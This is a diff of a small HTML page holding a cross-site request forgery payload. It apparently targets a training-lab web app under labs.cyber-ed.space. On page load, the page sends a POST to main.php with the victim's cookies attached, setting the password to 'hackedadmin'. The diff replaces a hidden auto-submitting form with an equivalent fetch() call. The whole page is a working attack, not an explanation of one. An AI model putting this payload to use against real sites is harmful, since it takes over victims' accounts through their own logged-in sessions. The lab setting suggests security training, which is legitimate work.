@@ -1,11 +1,14 @@
 <html>
   <body>
-    <form action="http://web.npuac2h8ruyu4adbcou9.labs.cyber-ed.space/main.php" method="POST" id="f">
-      <input type="hidden" name="action" value="change_password">
-      <input type="hidden" name="new_password" value="hackedadmin">
-    </form>
     <script>
-      document.getElementById('f').submit();
+      fetch('http://web.npuac2h8ruyu4adbcou9.labs.cyber-ed.space/main.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: 'action=change_password&new_password=hackedadmin',
+        credentials: 'include'
+      }).then(() => console.log('Request sent'));
     </script>
   </body>
 </html>
